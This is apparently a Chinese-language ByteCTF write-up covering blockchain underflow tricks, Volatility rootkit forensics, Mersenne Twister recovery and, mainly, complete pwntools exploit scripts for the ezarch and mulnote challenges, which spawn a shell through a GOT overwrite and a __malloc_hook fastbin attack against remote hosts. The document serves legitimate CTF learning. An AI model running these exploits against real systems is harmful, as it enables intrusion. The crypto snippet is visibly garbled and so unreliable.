## Misc
### Hello Bytectf
签到~
### betgame
剪刀石头布游戏，每次获胜的规则不一样但找到规律即可，3次一循环，手动打完即可。
### jigsaw
一堆图拼吾王。。吾王不懂人心  
最后flag，S写大了可还行
### bet
区块链题目，主要利用 1 + ~0x01 会下溢这一点
  1. 首先profit，使balance(0x02)为 1
  2. Bet() 无条件使自己变为 owner
  3. 0xf98b23c9 使猜测的数字变为0
  4. 调用一次 func_0219，要猜对，使balance变为 2，同时0x04【标志位】为1
  5. 调用一次 func_0219，要猜错，使balance变为 1
  6. 调用一次 func_03F7，猜错， 使balance 下溢
  7. 获得flag
### hf_
区块链题目，核心点依然是下溢。
  1. profit
  2. 0xbf1912bc 转账2 eth可变为owner
  3. 0x0f77e47d 转帐2，造成自己的balance下溢
  4. 获得flag
### ddd
  1. 准备 volatility 工具套件，将官方提供的Ubuntu1604.zip放置在 volatility/volatility/plugins/overlays/linux 中，之后的操作全部选择该文件包的profile
  2. 使用 linux_check_syscall 检查系统调用，发现 sys_read 被 HOOK，考虑 rootkit
  3. linux_enumerate_files 枚举文件，发现敏感文件 /root/dddd-*.ko /root/douyinko.ko
  4. dddd-*.ko 文件存在，使用 linux_find_file 指定inode，dump文件，分析后发现仅仅是用于dump内存的kernel mod
  5. douyinko.ko 已被删除，无inode信息，无法直接使用 linux_find_file dump该文件，linux_moddump总是卡死，不知道为什么
  6. linux_pslist 查看进程，发现两个 sftp-server
  7. 使用 linux_proc_maps -p 指定 sftp，查看进程内存地址信息
  8. 再使用 linux_dump_map -p 2777 -s 内存地址，dump sftp-server的堆区域
  9. 分析堆区域的数据，发现缓存的完整 ELF 文件，为douyinko.ko
  10. 准备Ubuntu16.04虚拟机，降级内核至4.4.0-131
  11. 将导出的douyinko.ko切割到正确大小之后，insmod douyinko.ko 加载该内核
  12. 新建一个文件，内容为 emm....Can you find flag? （最后需要跟一个换行符或者空格，否则长度刚刚好不够用，无法通过检查）
  13. 使用 cc1 或 cat 或 vim 或 vi 读取新建的文件，获得最终的flag
## Crypto
### lrlr
大概是四步
  1. 随机数还原，得到之后代码生成的所有 getrandbits
  2. 逆向lrand算法，得到 self.states
  3. 得到 self.states，就是c_list，最大剩余定理得到 m**17，开17得到结果
  4. 从seed 还原得到 flag
随机数
    def oldtest():
        f=open("old","wb")
        s=""
        for i in range(1000):
            s+=str(random.getrandbits(32))+"\n"
        f.write(s)
可从 old 文件中取得前 1000 组 randbits  
以 624 组计算得初始向量从而可以推算后续所有 randbits 方法得到值  
抄个程序生成 1000 组 32bit 后面的 72 组 128bit 值
> reference
> 
    # step2 get c_list
    def state_reverse(state, key):
        key = long_to_bytes(key)
        handle = AES.new(key, AES.MODE_CBC, "\x00"*16)
        output = handle.decrypt(long_to_bytes(state))
        return bytes_to_long(output)
    random_list = open('p_random_128_hex.txt','r').read().strip().split('\n')
    random_list = [int(op.strip('L'),16) for op in random_list]
    '''
    use_list = []
    for kk in range(80):
        num = 0
        for _ in range(4):
            num = num > 256:
                a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223
        #print 'a(init_state)',a
        return a
    for i in range(10000000):
        num = generate_init_state(num)
        tmp = long_to_bytes(num)
        if 'flag' in tmp or 'byte' in tmp:
            print tmp
## Re
### 驱动逆向
题目中指定了CPU为FakeIntel。同时又给定了长度为0x10的key  
将上述数据分别赋值到0x140006070和0x14006890处。  
使用peloader加载程序执行解密逻辑即可得到flag  
bytectf{d0f20eff6fc4f6060776c8ca63319a1e}
## Pwn
### ezarch
和拟态防御的simplevm类似的虚拟机题目。本题在运行自定义opcode的时候对ebp进行检查时，使用了错误的参数，导致ebp可以越界读写，从而修改结构体中保存的虚拟栈基地址，进而劫持got表。
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def memory_set(p, size, payload, eip, esp, ebp):
        p.sendlineafter('>', 'M')
        p.sendlineafter('size>', str(size))
        p.sendlineafter('size>', str(len(payload)))
        p.sendlineafter(')', payload)
        p.sendlineafter('eip>', str(eip))
        p.sendlineafter('esp>', str(esp))
        p.sendlineafter('ebp>', str(ebp))
    def run(p):
        p.sendlineafter('>', 'R')
    DEBUG = False
    #p = process('ezarch')
    p = remote('112.126.102.73', 9999)
    if DEBUG:
        gdb.attach(p)
    # get heap addr(r14 r15) and elf addr(r12 r13)
    payload  = '/bin/sh\x00'
    payload += '\x03\x22' + p32(0x10) + p32(17)    # mov [ebp] => [esp]
    payload += '\x0A\x00' + p32(0xF) + p32(0)      # pop [esp] => r15
    payload += '\x01\x10' + p32(0) + p32(0x1004)   # add 0x1004 => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp
    payload += '\x03\x22' + p32(0x10) + p32(17)    # mov [ebp] => [esp]
    payload += '\x0A\x00' + p32(0xE) + p32(0)      # pop [esp] => r14
    payload += '\x02\x10' + p32(0) + p32(0x1004)   # sub 0x1004 => r0 ; set r0 to 0
    payload += '\x01\x10' + p32(0) + p32(0x1008)   # add 0x1008 => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp
    payload += '\x03\x22' + p32(0x10) + p32(17)    # mov [ebp] => [esp]
    payload += '\x0A\x00' + p32(0xD) + p32(0)      # pop [esp] => r13
    payload += '\x02\x10' + p32(0) + p32(0x1008)   # sub 0x1008 => r0 ; set r0 to 0
    payload += '\x01\x10' + p32(0) + p32(0x100C)   # add 0x100C => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp
    payload += '\x03\x22' + p32(0x10) + p32(17)    # mov [ebp] => [esp]
    payload += '\x0A\x00' + p32(0xC) + p32(0)      # pop [esp] => r12
    payload += '\x02\x10' + p32(0) + p32(0x100C)   # sub 0x100C => r0 ; set r0 to 0
    # change stack base
    payload += '\x01\x10' + p32(0) + p32(0x1008)   # add 0x1008 => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp
    payload += '\x03\x00' + p32(1) + p32(13)       # mov r13 => r1
    payload += '\x02\x10' + p32(1) + p32(0xa8)     # sub 0xa8 => r1 ; free@got
    payload += '\x03\x02' + p32(17) + p32(1)       # mov r1 => [ebp]
    # get libc r10,r11
    payload += '\x02\x10' + p32(0) + p32(0x1008)   # sub 0x1008 => r0 ; set r0 to 0
    payload += '\x01\x10' + p32(0) + p32(0x30)     # add 0x30 => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp
    payload += '\x01\x10' + p32(2) + p32(0x400)    # sub 0x400 => r2
    payload += '\x03\x00' + p32(16) + p32(2)       # mov r2 => esp
    payload += '\x03\x22' + p32(0x10) + p32(17)    # mov [ebp] => [esp]
    payload += '\x0A\x00' + p32(11) + p32(0)       # pop [esp] => r11
    payload += '\x01\x10' + p32(0) + p32(4)        # add 0x4 => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp ; ebp = 0x34
    payload += '\x03\x22' + p32(0x10) + p32(17)    # mov [ebp] => [esp]
    payload += '\x0A\x00' + p32(10) + p32(0)       # pop [esp] => r10
    # get system
    payload += '\x02\x10' + p32(11) + p32(0x47c30) # sub 0x47c30 => r11 ; r11  r0 ; set r0 to 0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp ; ebp = 0x0  [ebp]
    payload += '\x01\x10' + p32(0) + p32(4)        # add 0x4 => r0
    payload += '\x03\x00' + p32(17) + p32(0)       # mov r0 => ebp ; ebp = 0x4
    payload += '\x03\x02' + p32(17) + p32(10)      # mov r10 => [ebp]
    payload += '\xFF'
    memory_set(p, 0x4010, payload, 8, 0x10, 0x1000)
    run(p)
    p.sendlineafter('>', 'M')
    p.sendlineafter('size>', str(20))
    #bytectf{0ccf4027c269fcbd1d0a74ddd62ba90a}
    p.interactive()
    p.close()
### mulnote
程序应该算加了混淆？但是还是很容易就能看清楚程序在做什么。漏洞在free的时候，thread中sleep后清空bss上的chunk地址，导致UAF。
    from pwn import *
    def add(p, size, content):
        p.sendlineafter('>', 'C')
        p.sendlineafter('size>', str(size))
        p.sendafter('note>', content)
    def delete(p, idx):
        p.sendlineafter('>', 'R')
        p.sendlineafter('index>', str(idx))
    def show(p):
        p.sendlineafter('>', 'S')
    def edit(p, idx, content):
        p.sendlineafter('>', 'E')
        p.sendlineafter('index>', str(idx))
        p.sendafter('new note>', content)
    def pwn():
        context.log_level = 'debug'
        context.terminal = ['tmux', 'split', '-h']
        DEBUG = False
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        elf = ELF('./mulnote')
        if DEBUG:
            p = process('./mulnote')
        else:
            p = remote('112.126.101.96', 9999)
        if DEBUG:
            gdb.attach(p)
        add(p, 0x98, 'sunichi') #0
        add(p, 0x68, 'sunichi') #1
        add(p, 0x68, 'sunichi') #2
        delete(p, 0)
        show(p)
        p.recvuntil('[*]note[0]:\n')
        recv = p.recv(6) + '\x00\x00'
        libc.address = u64(recv) - (0x7fc642ab9b78 - 0x00007fc6426f5000)
        delete(p, 1)
        delete(p, 2)
        edit(p, 2, p64(libc.symbols['__malloc_hook'] - 0x23))
        add(p, 0x68, 'sunichi')
        add(p, 0x68, '\x00\x00\x00' + p64(0) + p64(libc.address + 0xf02a4) + p64(libc.symbols['realloc']))
        sleep(15)
        p.sendlineafter('>', 'C')
        p.sendlineafter('size>', str(32))
    #bytectf{4f10583325b7a40ecd770dbb6fd54d59}
        print hex(libc.address)
        p.interactive()
        p.close()
    if __name__ == '__main__':
        pwn()
### vip
设置prctl的时候有栈溢出，通过栈溢出修改prctl的规则，使得open(urandom)的时候返回0从而绕过限制。最后做ROP进行orw就可以读出flag了。